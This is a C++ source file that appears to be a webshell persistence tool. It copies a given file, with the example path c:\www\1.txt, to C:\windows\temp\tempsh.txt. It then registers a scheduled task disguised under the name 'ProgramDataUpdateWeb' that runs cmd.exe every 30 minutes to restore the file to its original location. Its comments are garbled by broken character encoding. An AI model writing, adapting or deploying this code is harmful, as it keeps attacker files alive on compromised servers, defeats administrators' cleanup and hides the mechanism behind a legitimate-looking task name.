#include "TaskScheduler.h"

// wchar_t to string
void Wchar_tToString(std::string& szDst, wchar_t* wchar)
{
    wchar_t* wText = wchar;
    DWORD dwNum = WideCharToMultiByte(CP_OEMCP, NULL, wText, -1, NULL, 0, NULL, FALSE);// WideCharToMultiByte������
    char* psText; // psTextΪchar*����ʱ���飬��Ϊ��ֵ��std::string���м����
    psText = new char[dwNum];
    WideCharToMultiByte(CP_OEMCP, NULL, wText, -1, psText, dwNum, NULL, FALSE);// WideCharToMultiByte���ٴ�����
    szDst = psText;// std::string��ֵ
    delete[]psText;// psText�����
}

// �����locale��stringͷ�ļ���ʹ��setlocale������
std::wstring StringToWstring(const std::string str)
{// stringתwstring
    unsigned len = str.size() * 2;// Ԥ���ֽ���
    setlocale(LC_CTYPE, "");     //������ô˺���
    wchar_t* p = new wchar_t[len];// ����һ���ڴ���ת������ַ���
    mbstowcs(p, str.c_str(), len);// ת��
    std::wstring str1(p);
    delete[] p;// �ͷ�������ڴ�
    return str1;
}

int wmain(int argc, wchar_t* argv[]) {
    TaskSche task;
    if (argc == 2) {
        string strFilePath;
        Wchar_tToString(strFilePath, argv[1]);
        if (!task.isFileExist((LPSTR)"C:\\windows\\temp\\tempsh.txt"))
        {
            task.copyFile(strFilePath.data(), "C:\\windows\\temp\\tempsh.txt");
        }

        LPCWSTR wszTaskName = L"ProgramDataUpdateWeb";	// �ƻ���������
        wstring wstrTaskTime = L"PT30M";			// ����ÿ��������������֮���ʱ�䡣ÿ����ô���
        wstring wstrProgram = L"cmd.exe";		// ִ�еĳ���cmd.exe����rundll32.exe
        wstring args = L"/c copy c:\\windows\\temp\\tempsh.txt ";
        args.append(StringToWstring(strFilePath).data());
        wprintf(L"%s\n", args.data());
        task.TaskAdd(wszTaskName, wstrTaskTime, wstrProgram, args);
    }
    else {
        wprintf(L"Usage: %s c:\\www\\1.txt", argv[0]);
    }



}